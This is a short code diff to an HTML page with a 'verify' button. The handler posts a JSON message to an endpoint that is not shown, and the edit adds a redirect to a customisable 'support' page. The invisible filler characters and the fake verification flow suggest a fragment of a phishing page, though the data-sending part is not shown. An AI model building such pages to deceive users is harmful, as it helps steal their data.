@@ -1,7 +1,5 @@
 ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
 
-
-
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -125,8 +123,12 @@ document.getElementById("verifyBtn").addEventListener("click", function() {
         body: JSON.stringify(message)
     })
     .then(() => {
-        document.getElementById("responseMessage").innerText = "Verification complete!";
+        document.getElementById("responseMessage").innerText = "Verification complete! Redirecting...";
         document.getElementById("responseMessage").style.color = "green";
+
+        setTimeout(() => {
+            window.location.href = "support.html"; // ← CHANGE THIS TO YOUR SUPPORT PAGE URL
+        }, 1500);
     })
     .catch(() => {
         document.getElementById("responseMessage").innerText = "Error sending verification.";
